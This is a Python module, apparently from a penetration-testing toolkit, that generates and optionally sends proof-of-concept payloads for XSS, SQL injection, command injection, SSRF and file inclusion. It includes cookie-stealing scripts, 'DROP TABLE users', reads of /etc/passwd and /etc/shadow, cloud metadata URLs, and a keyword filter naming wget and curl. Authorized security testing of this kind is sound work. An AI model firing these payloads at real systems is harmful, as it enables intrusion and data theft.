"""
Advanced exploitation framework with proof-of-concept generation.

This module implements controlled exploitation capabilities for vulnerability
validation and impact assessment in authorized penetration testing scenarios.
"""

import asyncio
import logging
import base64
import json
import random
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple, Union
from urllib.parse import urljoin, urlparse, quote, unquote
import aiohttp

from recon.collectors import BaseCollector


logger = logging.getLogger(__name__)


class ExploitGenerator:
    """Generates proof-of-concept exploits for discovered vulnerabilities."""
    
    def __init__(self):
        self.exploit_templates = {
            'xss': {
                'payloads': [
                    '<script>alert("XSS-"+document.domain)</script>',
                    '<img src=x onerror="alert(document.cookie)">',
                    '<svg onload="alert(1)">',
                    'javascript:alert(document.domain)'
                ],
                'impact': 'Session hijacking, credential theft, defacement',
                'severity': 'medium'
            },
            'sqli': {
                'payloads': [
                    "' UNION SELECT username,password FROM users--",
                    "' OR '1'='1'--",
                    "'; DROP TABLE users;--",
                    "' AND (SELECT COUNT(*) FROM users)>0--"
                ],
                'impact': 'Complete database compromise, data exfiltration',
                'severity': 'critical'
            },
            'rce': {
                'payloads': [
                    '; cat /etc/passwd',
                    '| whoami',
                    '`id`',
                    '$(uname -a)',
                    '; echo "RCE_CONFIRMED"'
                ],
                'impact': 'Complete system compromise, reverse shell',
                'severity': 'critical'
            },
            'ssrf': {
                'payloads': [
                    'http://127.0.0.1:22',
                    'http://169.254.169.254/latest/meta-data/',
                    'file:///etc/passwd',
                    'http://localhost:3306'
                ],
                'impact': 'Internal network access, cloud metadata exposure',
                'severity': 'high'
            },
            'lfi': {
                'payloads': [
                    '../../../etc/passwd',
                    '../../../etc/shadow',
                    '../../../var/log/apache2/access.log',
                    '../../../proc/self/environ'
                ],
                'impact': 'Sensitive file disclosure, credential exposure',
                'severity': 'high'
            }
        }
        
        self.encoders = {
            'url_encode': lambda p: quote(p),
            'base64_encode': lambda p: base64.b64encode(p.encode()).decode(),
            'double_encode': lambda p: quote(quote(p))
        }
    
    def generate_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Generate proof-of-concept exploit for a vulnerability."""
        
        vuln_type = vulnerability.get('vulnerability_type', '').lower()
        parameter = vulnerability.get('parameter', '')
        url = vulnerability.get('url', '')
        method = vulnerability.get('method', 'GET')
        
        if vuln_type not in self.exploit_templates:
            return self._generate_generic_exploit(vulnerability)
        
        template = self.exploit_templates[vuln_type]
        
        exploit_data = {
            'vulnerability': vulnerability,
            'exploit_type': vuln_type,
            'target_url': url,
            'target_parameter': parameter,
            'payloads': [],
            'impact_assessment': self._assess_impact(vuln_type),
            'remediation': self._get_remediation(vuln_type),
            'timestamp': datetime.utcnow().isoformat()
        }
        
        # Generate payload variants
        for payload in template['payloads'][:3]:  # Limit to 3 payloads
            variants = [{'payload': payload, 'encoding': 'none'}]
            
            # Add encoded variants
            for enc_name, encoder in self.encoders.items():
                try:
                    encoded = encoder(payload)
                    variants.append({'payload': encoded, 'encoding': enc_name})
                except:
                    continue
            
            exploit_data['payloads'].append({
                'base_payload': payload,
                'variants': variants,
                'request_example': self._generate_request(url, parameter, payload, method)
            })
        
        return exploit_data
    
    def _generate_request(self, url: str, parameter: str, payload: str, method: str) -> str:
        """Generate example HTTP request."""
        
        if method.upper() == 'GET':
            separator = '&' if '?' in url else '?'
            return f"GET {url}{separator}{parameter}={quote(payload)} HTTP/1.1\nHost: {urlparse(url).netloc}\n"
        else:
            return f"POST {url} HTTP/1.1\nHost: {urlparse(url).netloc}\nContent-Type: application/x-www-form-urlencoded\n\n{parameter}={quote(payload)}"
    
    def _assess_impact(self, vuln_type: str) -> Dict[str, Any]:
        """Assess vulnerability impact."""
        
        impact_levels = {
            'xss': {'confidentiality': 'medium', 'integrity': 'medium', 'availability': 'low'},
            'sqli': {'confidentiality': 'high', 'integrity': 'high', 'availability': 'medium'},
            'rce': {'confidentiality': 'high', 'integrity': 'high', 'availability': 'high'},
            'ssrf': {'confidentiality': 'medium', 'integrity': 'low', 'availability': 'low'},
            'lfi': {'confidentiality': 'high', 'integrity': 'low', 'availability': 'low'}
        }
        
        return {
            'cia_impact': impact_levels.get(vuln_type, {'confidentiality': 'low', 'integrity': 'low', 'availability': 'low'}),
            'business_impact': self._get_business_impact(vuln_type),
            'risk_level': self._get_risk_level(vuln_type)
        }
    
    def _get_business_impact(self, vuln_type: str) -> List[str]:
        """Get business impact description."""
        
        impacts = {
            'xss': ['Customer data theft', 'Brand reputation damage'],
            'sqli': ['Complete data breach', 'Financial loss', 'Legal liability'],
            'rce': ['Complete system compromise', 'Data destruction', 'Service outage'],
            'ssrf': ['Internal network exposure', 'Cloud infrastructure compromise'],
            'lfi': ['Sensitive data exposure', 'Configuration disclosure']
        }
        
        return impacts.get(vuln_type, ['Potential security breach'])
    
    def _get_risk_level(self, vuln_type: str) -> str:
        """Get risk level for vulnerability type."""
        
        risk_levels = {
            'rce': 'critical',
            'sqli': 'critical',
            'ssrf': 'high',
            'lfi': 'high',
            'xss': 'medium'
        }
        
        return risk_levels.get(vuln_type, 'medium')
    
    def _get_remediation(self, vuln_type: str) -> Dict[str, List[str]]:
        """Get remediation advice."""
        
        remediation = {
            'xss': {
                'immediate': ['Implement output encoding', 'Use CSP headers', 'Validate input'],
                'long_term': ['Secure coding practices', 'Regular security reviews', 'WAF deployment']
            },
            'sqli': {
                'immediate': ['Use parameterized queries', 'Input validation', 'Least privilege'],
                'long_term': ['Database monitoring', 'Security updates', 'Network segmentation']
            },
            'rce': {
                'immediate': ['Avoid system commands', 'Input validation', 'Sandboxing'],
                'long_term': ['System hardening', 'Network monitoring', 'Incident response']
            },
            'ssrf': {
                'immediate': ['URL validation', 'Whitelist destinations', 'Network controls'],
                'long_term': ['Network segmentation', 'Monitoring', 'Access controls']
            },
            'lfi': {
                'immediate': ['Path validation', 'Avoid user input in paths', 'File permissions'],
                'long_term': ['Secure file handling', 'System hardening', 'Monitoring']
            }
        }
        
        return remediation.get(vuln_type, {
            'immediate': ['Review and patch vulnerability'],
            'long_term': ['Implement security best practices']
        })
    
    def _generate_generic_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Generate generic exploit for unknown vulnerability types."""
        
        return {
            'vulnerability': vulnerability,
            'exploit_type': 'generic',
            'target_url': vulnerability.get('url', ''),
            'target_parameter': vulnerability.get('parameter', ''),
            'payloads': [{
                'base_payload': vulnerability.get('payload', ''),
                'variants': [{'payload': vulnerability.get('payload', ''), 'encoding': 'none'}],
                'request_example': f"GET {vulnerability.get('url', '')} HTTP/1.1"
            }],
            'impact_assessment': {
                'cia_impact': {'confidentiality': 'low', 'integrity': 'low', 'availability': 'low'},
                'business_impact': ['Potential security risk'],
                'risk_level': 'low'
            },
            'remediation': {
                'immediate': ['Review vulnerability'],
                'long_term': ['Implement security controls']
            },
            'timestamp': datetime.utcnow().isoformat()
        }


class ExploitationFramework:
    """Main exploitation framework for vulnerability validation."""
    
    def __init__(self):
        self.exploit_generator = ExploitGenerator()
    
    async def exploit_vulnerability(self, vulnerability: Dict[str, Any], **kwargs) -> Dict[str, Any]:
        """Generate exploit for a vulnerability."""
        
        # Generate exploit
        exploit_data = self.exploit_generator.generate_exploit(vulnerability)
        
        # Determine if we should validate (safe testing only)
        validate_exploit = kwargs.get('validate_exploit', False)
        
        exploitation_results = {
            'vulnerability_id': vulnerability.get('id', ''),
            'exploit_data': exploit_data,
            'validation_attempted': validate_exploit,
            'validation_results': [],
            'status': 'generated',
            'timestamp': datetime.utcnow().isoformat()
        }
        
        if validate_exploit:
            # Only perform safe, non-destructive validation
            validation_results = await self._validate_exploit_safely(exploit_data)
            exploitation_results['validation_results'] = validation_results
            exploitation_results['status'] = 'validated' if validation_results else 'failed'
        
        return exploitation_results
    
    async def _validate_exploit_safely(self, exploit_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Perform safe, non-destructive validation."""
        
        results = []
        target_url = exploit_data.get('target_url', '')
        
        if not target_url:
            return results
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            
            for payload_group in exploit_data.get('payloads', []):
                for variant in payload_group.get('variants', []):
                    payload = variant.get('payload', '')
                    
                    # Only test safe payloads
                    if self._is_safe_payload(payload):
                        result = await self._test_payload_safely(session, target_url, payload)
                        if result:
                            results.append(result)
        
        return results
    
    def _is_safe_payload(self, payload: str) -> bool:
        """Check if payload is safe for validation."""
        
        # Avoid destructive operations
        dangerous_keywords = [
            'drop', 'delete', 'truncate', 'update', 'insert',
            'rm ', 'del ', 'format', 'shutdown', 'wget', 'curl'
        ]
        
        payload_lower = payload.lower()
        return not any(keyword in payload_lower for keyword in dangerous_keywords)
    
    async def _test_payload_safely(self, session: aiohttp.ClientSession, 
                                 target_url: str, payload: str) -> Optional[Dict[str, Any]]:
        """Test payload safely."""
        
        try:
            # Simple GET test with payload
            test_url = f"{target_url}?test={quote(payload)}"
            async with session.get(test_url) as response:
                content = await response.text()
            
            # Check for validation indicators
            validated = False
            indicators = []
            
            if payload in content:
                validated = True
                indicators.append('payload_reflected')
            
            if any(error in content.lower() for error in ['sql syntax', 'mysql error', 'ora-']):
                validated = True
                indicators.append('sql_error')
            
            if response.status >= 500:
                indicators.append('server_error')
            
            if validated:
                return {
                    'payload': payload,
                    'validated': True,
                    'indicators': indicators,
                    'timestamp': datetime.utcnow().isoformat()
                }
        
        except Exception as e:
            logger.debug(f"Validation test failed: {e}")
        
        return None


class ExploitationCollector(BaseCollector):
    """Exploitation collector for vulnerability validation."""
    
    def __init__(self):
        super().__init__("exploitation_framework")
        self.exploitation_framework = ExploitationFramework()
    
    async def collect(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Generate exploits for discovered vulnerabilities."""
        
        vulnerabilities = kwargs.get('vulnerabilities', [])
        
        if not vulnerabilities:
            return []
        
        # Generate exploits for each vulnerability
        for vulnerability in vulnerabilities:
            try:
                exploitation_result = await self.exploitation_framework.exploit_vulnerability(
                    vulnerability, **kwargs
                )
                
                self.add_result({
                    'type': 'exploitation_result',
                    'target': target,
                    'exploitation': exploitation_result
                })
            
            except Exception as e:
                logger.error(f"Failed to exploit vulnerability: {e}")
                continue
        
        return self.results


# Standalone usage
if __name__ == "__main__":
    async def test_exploitation():
        collector = ExploitationCollector()
        
        test_vulnerabilities = [
            {
                'id': 'test_1',
                'vulnerability_type': 'xss',
                'url': 'https://httpbin.org/get',
                'parameter': 'test_param',
                'payload': '<script>alert(1)</script>',
                'confidence': 0.8
            }
        ]
        
        results = await collector.collect(
            "https://httpbin.org",
            vulnerabilities=test_vulnerabilities,
            validate_exploit=True
        )
        
        print(f"Exploitation completed with {len(results)} results")
        for result in results:
            print(f"- {result.get('type')}: {result}")
    
    asyncio.run(test_exploitation())
